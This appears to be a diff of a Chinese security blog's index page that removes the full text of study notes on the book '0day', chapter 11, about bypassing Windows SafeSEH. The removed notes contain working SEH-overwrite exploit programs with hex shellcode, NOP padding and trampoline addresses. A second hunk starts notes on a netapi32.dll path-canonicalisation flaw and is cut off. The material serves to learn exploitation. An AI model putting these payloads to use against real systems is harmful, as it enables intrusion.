@@ -351,110 +351,15 @@
       
         
           
-            <h1 id="notes-about-0day-chapter-11"><a href="#notes-about-0day-chapter-11" class="headerlink" title="notes about 0day chapter 11"></a>notes about 0day chapter 11</h1><h2 id="from-11-1"><a href="#from-11-1" class="headerlink" title="from 11.1"></a>from 11.1</h2><p>简单回顾（SEH结构体）：  </p>
-<table>
-<thead>
-<tr>
-<th>Dword:Next SEH Header（低地址）</th>
-<th>SEH链表指针</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Dword:Exception Handler（高地址）</td>
-<td>异常处理函数句柄</td>
-</tr>
-</tbody></table>
-<p>safeSEH机制的几个校验：</p>
-<ol>
-<li>检查异常处理链（SEH链表指针）在当前程序栈中，若不在则终止异常处理函数得调用。</li>
-<li>检查异常处理函数句柄是否在当前栈中，若在则终止。</li>
-<li>在前面两项检查都通过后，程序调用一个全新的函数RtlIsValidHandler()，来对异常处理函数的有效性进行验证。</li>
-</ol>
-<p>RtlIsValidHandler的一些验证：  </p>
-<ol>
-<li>检查程序是否设置了IMAGE_DLLCHARACTERISTICS_NO_SEH 标识。如果设置了这个标识，这个程序内的异常会被忽略。所以当这个标志被设置时，函数直接返回校验失败。</li>
-<li>检测程序是否包含安全S.E.H 表。如果程序包含安全S.E.H 表，则将当前的异常处理函数地址与该表进行匹配，匹配成功则返回校验成功，匹配失败则返回校验失败。</li>
-<li>判断程序是否设置ILonly 标识。如果设置了这个标识，说明该程序只包含.NET编译人中间语言，函数直接返回校验失败。</li>
-<li>判断异常处理函数地址是否位于不可执行页（non-executable page）上。当异常处理函数地址位于不可执行页上时，校验函数将检测DEP 是否开启，如果系统未开启DEP 则返回校验成功，否则程序抛出访问违例的异常。</li>
-</ol>
-<p>若SEH句柄地址不在加载模块的内存空间上，会进行如下的判断：</p>
-<ol>
-<li>判断异常处理函数地址是否位于不可执行页（non-executable page）上。当异常处理函数地址位于不可执行页上时，校验函数将检测DEP 是否开启，如果系统未开启DEP 则返回校验成功，否则程序抛出访问违例的异常。</li>
-<li>判断系统是否允许跳转到加载模块的内存空间外执行，如果允许则返回校验成功，否则返回校验失败。</li>
-</ol>
-<p><img src="/2020/04/17/safeSEH/safeSEH1.JPG" alt></p>
-<p>相关伪代码如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">RtlIsValidHandler</span><span class="params">(handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (handler is in an <span class="built_in">image</span>) &#123; <span class="comment">//在加载模块内存空间内</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">image</span> has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag <span class="built_in">set</span>)</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">image</span> has a SafeSEH table) <span class="comment">//含有安全S.E.H 表，说明程序启用SafeSEH</span></span><br><span class="line">            <span class="keyword">if</span> (handler found in the table)<span class="comment">//异常处理函数地址出现在安全S.E.H 表中</span></span><br><span class="line">                <span class="keyword">return</span> TRUE;</span><br><span class="line">            <span class="keyword">else</span> <span class="comment">//异常处理函数未出现在安全S.E.H 表中</span></span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">image</span> is a .NET assembly with the ILonly flag <span class="built_in">set</span>) <span class="comment">//只包含IL</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (handler is on a non-executable page) &#123; <span class="comment">//跑到不可执行页上了</span></span><br><span class="line">        <span class="keyword">if</span> (ExecuteDispatchEnable <span class="built_in">bit</span> <span class="built_in">set</span> in the <span class="built_in">process</span> flags) <span class="comment">//DEP 关闭</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            raise ACCESS_VIOLATION; <span class="comment">//抛出访问违例异常</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (handler is <span class="keyword">not</span> in an <span class="built_in">image</span>) &#123; <span class="comment">//在加载模块内存之外，并且在可执行页上</span></span><br><span class="line">        <span class="keyword">if</span> (ImageDispatchEnable <span class="built_in">bit</span> <span class="built_in">set</span> in the <span class="built_in">process</span> flags)</span><br><span class="line">        <span class="comment">//允许在加载模块内存空间外执行</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE; <span class="comment">//前面条件都不满足的话只能允许这个异常处理函数执行了</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>根据伪代码可以清晰整理出使得返回值为1的方法：</p>
-<ol>
-<li>在加载模块内没有SEH表。</li>
-<li>在加载模块内且在SEH表中。</li>
-<li>在不可执行的分页且DEP关闭。</li>
-<li>在加载模块之外且DEP关闭。</li>
-</ol>
-<p>其中可以使得shellcode可能执行的为1，2，4，具体方法：</p>
-<ol>
-<li>针对上的4，排除DEP 干扰后，我们只需在加载模块内存范围之外找到一个跳板指令就可以转入shellcode 执行，<br>这点还是比较容易实现的。</li>
-<li>针对上的2，我们可以利用未启用SafeSEH 模块中的指令作为跳板，转入shellcode<br>执行，这也是为什么我们说SafeSEH 需要操作系统与编译器的双重支持。在加载模块中找到一个未启用的SafeSEH 模块也不是一件很困难的事情。</li>
-<li>针对上的1，一是清空安全S.E.H 表，造成该模块未启用SafeSEH 的假象；二是将我们的指令注册到安全S.E.H 表中。由于安全S.E.H 表的信息在内存中是加密存放的，所以突破它的可能性也不大，这条路我们就先放弃吧。</li>
-</ol>
-<p>书中还阐述了比较简单的攻击方法：</p>
-<ol>
-<li>不攻击SEH，可以考虑覆盖返回地址或者虚函数表等信息。</li>
-<li>利用S.E.H 的终极特权！这种安全校验存在一个严重的缺陷——如果S.E.H 中的异常函数指针指向堆区，即使安全校验发现了S.E.H 已经不可信，仍然会调用其已被修改过的异常<br>处理函数，因此只要将shellcode 布置到堆区就可以直接跳转执行！</li>
-</ol>
-<p>即将shellcode布置到堆区中（当然DEP关闭）。</p>
-<h2 id="from-11-4"><a href="#from-11-4" class="headerlink" title="from 11.4"></a>from 11.4</h2><p>实验要点：</p>
-<p>当strcpy时产生溢出，当test时出现异常，异常调用的SEH中的异常函数指针指向堆区，故可以绕过safeSEH。</p>
-<p>shellcode在堆中的位置：0x00392A60</p>
-<p>shellcode在栈中的起始位置：0x0012FDB4</p>
-<p>test栈中的SEH处理指针：0x0012FFAC-&gt;0x00411078</p>
-<p>所以shellcode：504(shellcode+patch)+addr(0x00392A60)</p>
-<p>使用书中的弹窗shellcode，得到的整个代码：  </p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"</span></span><br><span class="line"><span class="comment">//patch</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x60\x2A\x39\x00"</span></span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span> * input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">200</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(str,input);</span><br><span class="line">	<span class="comment">//__asm int 3;</span></span><br><span class="line">	<span class="keyword">int</span> zero=<span class="number">0</span>;</span><br><span class="line">	zero=<span class="number">1</span>/zero;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> * buf=(<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">500</span>);</span><br><span class="line">	<span class="comment">//__asm int 3</span></span><br><span class="line">	<span class="built_in">strcpy</span>(buf,shellcode);</span><br><span class="line">	test(shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>验证结果：</p>
-<p><img src="/2020/04/17/safeSEH/success1.JPG" alt></p>
-<h2 id="from-11-5"><a href="#from-11-5" class="headerlink" title="from 11.5"></a>from 11.5</h2><h3 id="利用未启用SafeSEH模块绕过SafeSEH"><a href="#利用未启用SafeSEH模块绕过SafeSEH" class="headerlink" title="利用未启用SafeSEH模块绕过SafeSEH"></a>利用未启用SafeSEH模块绕过SafeSEH</h3><p>这里布置了一个没开启safeSEH的模块进行测试：</p>
-<p><img src="/2020/04/17/safeSEH/safeSEH2.JPG" alt></p>
-<p>使用的pop pop ret指令地址：</p>
-<p>111211B6        pop ecx<br>                pop ecx<br>                retn</p>
-<p>所以将SEH handle的地址覆盖为0x111211B6即可。</p>
-<p>SEH指针地址：0x0012FE94</p>
-<p>参数的开始地址：0x0012FDB8</p>
-<p>所以需要220的patch。</p>
-<p>所以payload=patch(“0x90”*220)+(0x111211B6)+(“0x90”8)+shellcode</p>
-<p>测试代码：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SEH_NOSafeSEH.EXE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[]=</span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\xB6\x11\x12\x11"</span><span class="comment">//address of pop pop retn in No_SafeSEH module</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"</span></span><br><span class="line">;</span><br><span class="line"><span class="function">DWORD <span class="title">MyException</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"There is an exception"</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span> * input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">200</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(str,input);</span><br><span class="line">	<span class="keyword">int</span> zero=<span class="number">0</span>;</span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		zero=<span class="number">1</span>/zero;</span><br><span class="line">	&#125;</span><br><span class="line">	__except(MyException())</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	HINSTANCE hInst = LoadLibrary(_T(<span class="string">"SEH_NOSafeSEH_JUMP.dll"</span>));<span class="comment">//load No_SafeSEH module</span></span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">200</span>];</span><br><span class="line">	__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">	test(shellcode);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在0x111211B6设置断点，在程序将参数拷贝完成后f9，可以看到程序直接跳转到布置的（pop pop retn）处：</p>
-<p><img src="/2020/04/17/safeSEH/success2.JPG" alt></p>
-<p>此时就因为地址指向的是未开启safeSEH的地方，所以可以进行跳转。<br>f9继续运行即可看到shellcode执行成功：</p>
-<p><img src="/2020/04/17/safeSEH/success3.JPG" alt></p>
-<h2 id="from-11-6"><a href="#from-11-6" class="headerlink" title="from 11.6"></a>from 11.6</h2><h3 id="利用加载模块之外的地址绕过SafeSEH"><a href="#利用加载模块之外的地址绕过SafeSEH" class="headerlink" title="利用加载模块之外的地址绕过SafeSEH"></a>利用加载模块之外的地址绕过SafeSEH</h3><p>当seh指针指向的是模块之外的映射空间时，不会进行校验安全性。在这种映射文件中找到跳板指令即可。</p>
-<p>找一条这样的跳转指令：</p>
-<p><img src="/2020/04/17/safeSEH/safeSEH3.JPG" alt></p>
-<p>跳板指令地址：0x00280B0B</p>
-<p>这里因为有\x00作为截断，所以不能将shellcode布置到该地址后面。书中介绍了一个跳转的方法，可是调试以后发现这个方法也是建立在一个巧合之上的：ebp+0x30 处存放的是 next SEH struct，即SEH handle的上面四个字节。</p>
-<p>使用两个字节的短跳转指令（EB 一个字节偏移）跳转到5个字节的长跳转指令处（E9 四个字节偏移），栈中的布置：  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E9 (四个字节的偏移到shellcode开始处) 90 90(这里一共八个字节)</span><br><span class="line">EB F6 90 90(跳转到上一句)</span><br></pre></td></tr></table></figure>
-
-<p>SEH handle addr：0x0012FF64</p>
-<p>存放长长地址跳转的地址：0x0012FF60</p>
-<p>参数起始地址：0x0012FE88</p>
-<p>所以整个shellcode：</p>
-<p>(168 bytes shellcode)+</p>
-<p>(40 bytes nop)+</p>
-<p>(8 bytes “\xE9\x2B\xFF\xFF\xFF\x90\x90\x90”)+</p>
-<p>(4 bytes “\xB\xF6\x90\x90”)+跳板指令</p>
-<p>最后到的代码：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> shellcode[]=                   </span><br><span class="line"><span class="string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span></span><br><span class="line"><span class="string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span></span><br><span class="line"><span class="string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span></span><br><span class="line"><span class="string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span></span><br><span class="line"><span class="string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span></span><br><span class="line"><span class="string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span></span><br><span class="line"><span class="string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span></span><br><span class="line"><span class="string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span></span><br><span class="line"><span class="string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span></span><br><span class="line"><span class="string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span></span><br><span class="line"><span class="string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"</span>      </span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span>      </span><br><span class="line"><span class="string">"\xE9\x2B\xFF\xFF\xFF\x90\x90\x90"</span>      </span><br><span class="line"><span class="string">"\xEB\xF6\x90\x90"</span>                      </span><br><span class="line"><span class="string">"\x0B\x0B\x28\x00"</span>                    </span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line"><span class="function">DWORD <span class="title">MyException</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"There is an exception"</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span> * input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">200</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(str,input);</span><br><span class="line">	<span class="keyword">int</span> zero=<span class="number">0</span>;</span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		zero=<span class="number">1</span>/zero;</span><br><span class="line">	&#125;</span><br><span class="line">	__except(MyException())</span><br><span class="line">	&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//__asm int 3</span></span><br><span class="line">	test(shellcode);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>最终结果：</p>
-<p><img src="/2020/04/17/safeSEH/success34.JPG" alt></p>
-
-          
+          notes about 0day chapter 11from 11.1简单回顾（SEH结构体）： 
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/04/17/safeSEH/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -594,38 +499,15 @@
       
         
           
-            <h1 id="简要分析"><a href="#简要分析" class="headerlink" title="简要分析"></a>简要分析</h1><p>漏洞点存在为netapi32.dll中的NetpwPathCanonicalize()导出函数，NetpwPathCanonicalize()是netapi32.dll的一个导出函数，用于格式化网络路径字符串，它的原型如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int NetpwPathCanonicalize (</span><br><span class="line">uint16 path[ ], // [in] path name</span><br><span class="line">uint8 can_path[ ], // [out] canonicalized path</span><br><span class="line">uint32 maxbuf, // [in] max size of can_path</span><br><span class="line">uint16 prefix[ ], // [in] path prefix</span><br><span class="line">uint32* pathtype, // [in out] path type</span><br><span class="line">uint32 pathflags // [in] path flags, 0 or 1</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-
